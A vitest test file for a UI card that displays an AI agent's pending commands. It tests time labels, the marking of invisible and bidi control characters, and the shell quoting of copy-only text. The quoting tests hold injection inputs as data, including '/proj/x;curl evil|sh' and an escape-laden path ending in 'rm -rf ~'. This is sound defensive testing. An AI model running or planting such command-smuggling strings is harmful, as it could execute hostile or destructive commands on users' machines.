import { describe, expect, it } from "vitest";
import {
  copyOnlyText,
  formatWaiting,
  visibleControls,
} from "../../../src/overlays/action-card/format.ts";

// M4.07: "how long" on the card. `formatWaiting(ms)` takes the elapsed milliseconds
// (store clock minus the attention record's `since`) and returns a short whole-second label.

describe("formatWaiting", () => {
  it.each([
    [0, "0s"],
    [999, "0s"],
    [45_000, "45s"],
    [59_999, "59s"],
    [60_000, "1m 0s"],
    [125_000, "2m 5s"],
    [3_599_000, "59m 59s"],
    [3_600_000, "1h 0m"],
    [3_725_000, "1h 2m"],
    [90_000_000, "25h 0m"],
  ])("%i ms is %s", (ms, label) => {
    expect(formatWaiting(ms)).toBe(label);
  });

  it("never shows a negative or non-finite wait (clock skew, bad timestamp)", () => {
    expect(formatWaiting(-5_000)).toBe("0s");
    expect(formatWaiting(Number.NaN)).toBe("0s");
    expect(formatWaiting(Number.POSITIVE_INFINITY)).toBe("0s");
  });
});

// M4.07 security review M1: text that hides or reorders what the user reads is shown as a visible
// `<U+XXXX>` marker (uppercase hex, at least four digits). `visibleControls(text)` is applied to
// every agent-supplied string the card shows: the command, cwd, tool name, session id, agent name.
// Newline and tab stay as they are.

describe("visibleControls", () => {
  const marker = (code: number) => `<U+${code.toString(16).toUpperCase().padStart(4, "0")}>`;
  const range = (from: number, to: number) =>
    Array.from({ length: to - from + 1 }, (_, i) => from + i);

  const groups: Array<[string, number[]]> = [
    ["bidi embeddings and overrides (U+202A-202E)", range(0x202a, 0x202e)],
    ["bidi isolates (U+2066-2069)", range(0x2066, 0x2069)],
    [
      "Arabic letter mark and the directional marks (U+061C, U+200E, U+200F)",
      [0x061c, 0x200e, 0x200f],
    ],
    [
      "zero-width characters (U+200B-200D, U+2060, U+FEFF)",
      [...range(0x200b, 0x200d), 0x2060, 0xfeff],
    ],
    ["C0 controls except tab and newline", [...range(0x00, 0x08), ...range(0x0b, 0x1f)]],
    ["C1 controls (U+0080-009F)", range(0x80, 0x9f)],
    ["soft hyphen (M4.15 L-A)", [0x00ad]],
    [
      "invisible operators and deprecated formatting",
      [...range(0x2061, 0x2064), ...range(0x206a, 0x206f)],
    ],
    ["variation selectors", range(0xfe00, 0xfe0f)],
    ["astral tags including the explicitly listed range", range(0xe0000, 0xe007f)],
    ["Hangul fillers", [0x3164, 0xffa0]],
    ["line and paragraph separators (Zl/Zp)", [0x2028, 0x2029]],
    ["Mongolian vowel separator and combining grapheme joiner", [0x180e, 0x034f]],
    ["remaining Cc controls", [0x7f]],
    [
      "remaining Cf format characters",
      [
        ...range(0x0600, 0x0605),
        0x06dd,
        0x070f,
        0x0890,
        0x0891,
        0x08e2,
        ...range(0xfff9, 0xfffb),
        0x110bd,
        0x110cd,
        ...range(0x13430, 0x1343f),
        ...range(0x1bca0, 0x1bca3),
        ...range(0x1d173, 0x1d17a),
      ],
    ],
  ];

  it.each(groups)("marks %s", (_name, codes) => {
    const out = codes.map((code) => visibleControls(`a${String.fromCodePoint(code)}b`));
    expect(out).toEqual(codes.map((code) => `a${marker(code)}b`));
  });

  it("leaves newline, tab, spaces and ordinary text alone", () => {
    const text = "echo 'héllo wörld' ☃ \u{1f600}\n\tindented  line\n";
    expect(visibleControls(text)).toBe(text);
  });

  it("marks every occurrence and keeps the text between", () => {
    expect(visibleControls("\u202eabc\u202e\u200bdef")).toBe("<U+202E>abc<U+202E><U+200B>def");
  });

  it("marks astral tags as one code point between ordinary astral text and layout", () => {
    expect(visibleControls("😀\u{e0061}\tco\u00adpy\n🚀")).toBe("😀<U+E0061>\tco<U+00AD>py\n🚀");
  });

  it("returns an empty string unchanged", () => {
    expect(visibleControls("")).toBe("");
  });
});

// M4.17 L2: default-ignorable code points and non-ASCII spaces hide or fake text too, so they get
// the same visible `<U+XXXX>` marker. Ordinary ASCII space and letters stay as they are.
describe("visibleControls: default-ignorables and non-ASCII spaces (M4.17 L2)", () => {
  const marker = (code: number) => `<U+${code.toString(16).toUpperCase().padStart(4, "0")}>`;
  const codes = [
    0x115f, 0x1160, 0x17b4, 0x17b5, 0x180b, 0x180c, 0x180d, 0x180f, 0xe0100, 0xe01ef, 0x00a0,
    0x1680, 0x2000, 0x2001, 0x2005, 0x200a, 0x202f, 0x205f, 0x3000, 0x2800,
  ];

  it.each(codes.map((code) => [marker(code), code] as const))("marks %s", (_label, code) => {
    expect(visibleControls(`a${String.fromCodePoint(code)}b`)).toBe(`a${marker(code)}b`);
  });

  it("leaves an ordinary ASCII space and letters unchanged", () => {
    expect(visibleControls("ls -la /tmp/my dir")).toBe("ls -la /tmp/my dir");
  });
});

// M4.17 M1: the Open session copy-only text is pasted into a terminal, and the recorded cwd is free
// text. Each value is POSIX single-quoted (a `'` becomes `'\''`), one per line:
//   session '<id>'
//   cwd '<path>'      (only when there is a cwd)
// Control and invisible characters are still removed first.
describe("copyOnlyText (M4.17 M1)", () => {
  const Q = "'\\''"; // the four characters that stand for one single quote inside quotes

  it("puts the session id and the working directory on two single-quoted lines", () => {
    expect(copyOnlyText({ sessionId: "sess-1", cwd: "/work/app" })).toBe(
      "session 'sess-1'\ncwd '/work/app'",
    );
  });

  it("has only the session line when there is no working directory", () => {
    expect(copyOnlyText({ sessionId: "sess-1" })).toBe("session 'sess-1'");
    expect(copyOnlyText({ sessionId: "sess-1", cwd: undefined })).toBe("session 'sess-1'");
  });

  it.each([
    ["a semicolon command", "/p/a;touch x", "'/p/a;touch x'"],
    ["a command substitution", "/p/$(id)", "'/p/$(id)'"],
    ["a backtick command", "/p/`id`", "'/p/`id`'"],
    ["a pipe", "/proj/x;curl evil|sh", "'/proj/x;curl evil|sh'"],
    ["a single quote", "a'b", `'a${Q}b'`],
    ["two single quotes in a row", "a''b", `'a${Q}${Q}b'`],
    ["a space", "a b", "'a b'"],
    ["a double quote and a backslash", 'a"b\\c', `'a"b\\c'`],
  ])("quotes a cwd with %s", (_name, cwd, quoted) => {
    expect(copyOnlyText({ sessionId: "sess-1", cwd })).toBe(`session 'sess-1'\ncwd ${quoted}`);
  });

  it("quotes the session id the same way", () => {
    expect(copyOnlyText({ sessionId: "s'1;id" })).toBe(`session 's${Q}1;id'`);
  });

  it("still removes control characters, so the text never gains a line", () => {
    const copied = copyOnlyText({
      sessionId: "sess-1",
      cwd: "/work/app\u001b]0;x\u0007\nrm -rf ~\r",
    });
    expect(copied.split("\n")).toHaveLength(2);
    expect(copied).not.toContain("\u001b");
    expect(copied).not.toContain("\u0007");
    expect(copied).not.toContain("\r");
  });
});
